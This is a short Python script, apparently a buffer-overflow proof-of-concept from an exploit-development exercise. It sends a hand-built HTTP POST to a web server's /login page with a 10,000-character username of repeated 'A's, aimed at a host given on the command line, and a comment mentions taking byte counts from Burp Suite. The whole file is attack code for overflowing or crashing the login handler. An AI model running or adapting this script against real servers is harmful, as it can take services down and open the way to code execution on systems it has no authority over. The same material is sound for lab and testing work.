#!/usr/bin/python
import socket
import sys

dados = "A" * 10000

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.1.9\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate, br\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n" 
#Always look for the bytes amount in the original Burp Suite
request+="Content-Length: {}\r\n".format(len(dados) + 20)  # Correct length
request+="Origin: http://192.168.1.9\r\n"
request+="Connection: keep-alive\r\n"
request+="Referer: http://192.168.1.9/login\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username="+dados+"&password=A"

#encode the request to bytes
request_bytes = request.encode("utf-8")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],80))
s.send(request_bytes)
